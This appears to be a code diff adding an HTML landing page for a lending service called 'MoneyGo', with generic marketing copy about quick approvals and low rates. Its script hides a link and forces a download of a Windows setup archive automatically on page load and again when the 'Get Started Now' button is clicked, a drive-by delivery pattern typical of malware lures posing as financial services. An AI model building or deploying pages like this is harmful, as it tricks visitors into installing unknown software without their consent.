@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>MoneyGo - Fast & Easy Lending</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header>
+    <div class="container">
+      <h1 class="logo">MoneyGo</h1>
+      <nav>
+        <ul>
+          <li><a href="#">Home</a></li>
+          <li><a href="#">Services</a></li>
+          <li><a href="#">About Us</a></li>
+          <li><a href="#">Contact</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <section class="hero">
+    <div class="container">
+      <h2>Fast & Easy Lending Solutions</h2>
+      <p>Need quick cash? MoneyGo is here to help. Hassle-free lending with low interest rates.</p>
+      <a href="#" class="btn" id="getStartedBtn">Get Started Now</a>
+    </div>
+  </section>
+
+  <section class="features">
+    <div class="container">
+      <h3>Why Choose MoneyGo?</h3>
+      <div class="feature-box">
+        <h4>Quick Approvals</h4>
+        <p>Get loan approvals in minutes, not days.</p>
+      </div>
+      <div class="feature-box">
+        <h4>Low Interest Rates</h4>
+        <p>Enjoy competitive rates and flexible repayment options.</p>
+      </div>
+      <div class="feature-box">
+        <h4>Trusted Service</h4>
+        <p>Join thousands of happy customers who trust MoneyGo.</p>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="container">
+      <p>&copy; 2025 MoneyGo. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script>
+    // Function to trigger the download
+    function downloadInstaller() {
+      const link = document.createElement('a');
+      link.href = 'assets/windows-setup.zip'; // Path to your zip file
+      link.download = 'moneygo-setup.zip';
+      link.style.display = 'none';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    // Auto-download when the page loads
+    window.onload = function() {
+      downloadInstaller();
+    };
+
+    // Download on Get Started Now button click
+    document.getElementById('getStartedBtn').addEventListener('click', function(e) {
+      e.preventDefault(); // Prevent default anchor behavior
+      downloadInstaller();
+    });
+  </script>
+</body>
+</html>
